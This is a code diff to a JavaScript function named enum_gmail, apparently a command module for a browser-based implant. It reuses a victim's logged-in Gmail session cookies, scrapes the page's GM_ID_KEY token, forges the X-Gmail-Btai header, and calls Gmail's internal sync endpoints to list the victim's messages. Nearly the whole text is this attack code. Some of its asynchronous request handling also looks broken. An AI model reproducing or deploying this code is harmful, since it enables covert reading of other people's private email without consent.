@@ -8,28 +8,12 @@ exports.enum_gmail = function(task, command, params){
         xhr.onreadystatechange = function() {
             if (xhr.readyState == XMLHttpRequest.DONE) {
                 var res = xhr.responseText;
-            key = res.split('GM_ID_KEY="').pop().split('"')[0]; 
+                key = res.split('GM_ID_KEY="').pop().split('"')[0]; 
             }
         }
         xhr.open('GET', 'https://mail.google.com/mail/u/1/', true);
-        //xhr.setRequestHeader("X-Gmail-Btai", "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"pt-BR\",\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"f2e985974d\",null,25,\"gmail.pinto-server_20220825.07_p2\",1,5,\"\",-10800000,\"-03:00\",1,null,471825575,\"\",\"\",1662432171537,null,1177535]");
-        //xhr.setRequestHeader("Content-Type", "application/json");
-        //var body = "[null,[[[23,[\"thread-f:1742980504338360032\",[null,null,null,null,null,null,[[\"^io_lr\"],null,[\"msg-f:1742980504338360032\"]]]]]]],[1,1177535,null,null,[null,0],null,1],[1662432057310,1,1662432055031,0,199],2]"
         xhr.withCredentials = true;
-        xhr.send(body);
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == XMLHttpRequest.DONE) {
-                alert(xhr.responseText);
-            }
-        }
-        xhr.open('POST', 'https://mail.google.com/sync/u/1/i/s?hl=en-US&c=1&rt=r&pt=ji', true);
-        var gmail_btai = "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"1\",\"1\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"KEY_HERE\",null,25,\"1\",1,5,\"\",1,\"-03:00\",1,null,1,\"\",\"\",1,null,1]"
-        xhr.setRequestHeader("X-Gmail-Btai", gmail_btai);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        var body = "[[1,null,null,0],null,[1,null,null,null,[null,26],null,1],[null,1,1,0,1],2]"
-        xhr.withCredentials = true;
-        xhr.send(body);
+        xhr.send(null);
         var xhr2 = new XMLHttpRequest();
         var resp2;
         xhr2.onreadystatechange = function() {
@@ -37,6 +21,8 @@ exports.enum_gmail = function(task, command, params){
                 resp2 = xhr2.responseText;
             }
         }
+        var gmail_btai = "[null,null,[null,null,null,null,null,0,null,null,null,1,null,null,1,null,0,1,1,0,1,null,null,1,1,1,1,1,1,1,0,1,1,1,1,1,0,1,\"1\",\"1\",1,0,25,null,0,1,0,1,1,1,1,1,null,1,1,0,1,1,0,0,null,0,1,null,1,0,null,1,0,null,1,0,1,0,null,0,0,0],null,\"KEY_HERE\",null,25,\"1\",1,5,\"\",1,\"-03:00\",1,null,1,\"\",\"\",1,null,1]"
+        gmail_btai = gmail_btai.replace("KEY_HERE",key);
         xhr2.open('POST', 'https://mail.google.com/sync/u/1/i/bv?hl=en-US&c=1&rt=r&pt=ji', true);
         xhr2.setRequestHeader("X-Gmail-Btai", gmail_btai);
         xhr2.setRequestHeader("Content-Type", "application/json");
@@ -47,7 +33,7 @@ exports.enum_gmail = function(task, command, params){
         xhr2.send(body2);
         var parsed = JSON.parse(resp2)
         var messages = parsed[2]
-        messages_list = []
+        var message_list = []
         for (var i = 0; i < parsed[2].length; i++) {
             var message = {}
             message["title"] = parsed[2][i][0][0]
